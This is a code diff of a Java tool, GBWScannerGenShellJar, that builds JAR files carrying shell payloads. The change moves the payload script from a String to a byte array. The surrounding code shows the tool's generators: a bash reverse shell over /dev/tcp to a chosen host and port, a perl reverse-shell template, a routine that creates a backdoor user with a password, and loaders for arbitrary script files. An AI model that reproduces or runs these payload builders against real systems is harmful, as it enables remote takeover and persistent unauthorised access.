@@ -33,7 +33,7 @@ public class GBWScannerGenShellJar {
 
     }
 
-    public static String makeJarPackage(String jclass,String jarMainClassPath,String cmd,String script,boolean isMove) throws IOException {
+    public static String makeJarPackage(String jclass,String jarMainClassPath,String cmd,byte[] script,boolean isMove) throws IOException {
 
         String metaContent = "Manifest-Version: 1.0\n" +
                 "Archiver-Version: Plexus Archiver\n" +
@@ -55,7 +55,7 @@ public class GBWScannerGenShellJar {
         writeJarEntry(jarPut,"cmd",cmd.getBytes());
 
         /*write script*/
-        writeJarEntry(jarPut,"script",script.getBytes());
+        writeJarEntry(jarPut,"script",script);
 
         jarPut.close();
 
@@ -98,12 +98,12 @@ public class GBWScannerGenShellJar {
 
         String script = String.format(template,rhost,rport);
 
-        return makeJarPackage(jclass,jarMainClassPath,"perl",script,isMove);
+        return makeJarPackage(jclass,jarMainClassPath,"perl",script.getBytes(),isMove);
     }
 
     public static String makeBashShell(String jclass,String jarMainClassPath,String rhost,int rport,boolean isMove) throws IOException {
         String script = String.format("/bin/bash -i >& /dev/tcp/%s/%d 0>&1",rhost,rport);
-        return makeJarPackage(jclass,jarMainClassPath,"sh",script,isMove);
+        return makeJarPackage(jclass,jarMainClassPath,"sh",script.getBytes(),isMove);
     }
 
     public static String makeCreateUserShell(String jclass,String jarMainClassPath,String user,String passwd,boolean isMove) throws IOException {
@@ -120,12 +120,12 @@ public class GBWScannerGenShellJar {
 
         String script = String.format(template,user,passwd,user);
 
-        return makeJarPackage(jclass,jarMainClassPath,"sh",script,isMove);
+        return makeJarPackage(jclass,jarMainClassPath,"sh",script.getBytes(),isMove);
     }
 
     public static String makeShellFromScriptFile(String jclass,String jarMainClassPath,String cmd,String scriptFile,boolean isMove) throws IOException {
 
-        return makeJarPackage(jclass,jarMainClassPath,cmd,new String(Files.readAllBytes(Paths.get(scriptFile))),isMove);
+        return makeJarPackage(jclass,jarMainClassPath,cmd,Files.readAllBytes(Paths.get(scriptFile)),isMove);
     }
 
     public static void main(String[] args) throws ParseException, IOException {
@@ -187,7 +187,7 @@ public class GBWScannerGenShellJar {
 
         if(cliParser.hasOption("script")){
             String[] splits = cliParser.getOptionValue("script").split(":");
-            System.out.println(makeJarPackage(jclass,jarMainClassPath,splits[0],splits[1],isMove));
+            System.out.println(makeJarPackage(jclass,jarMainClassPath,splits[0],splits[1].getBytes(),isMove));
         }
         if(cliParser.hasOption("fscript")){
             String[] splits = cliParser.getOptionValue("fscript").split(":");
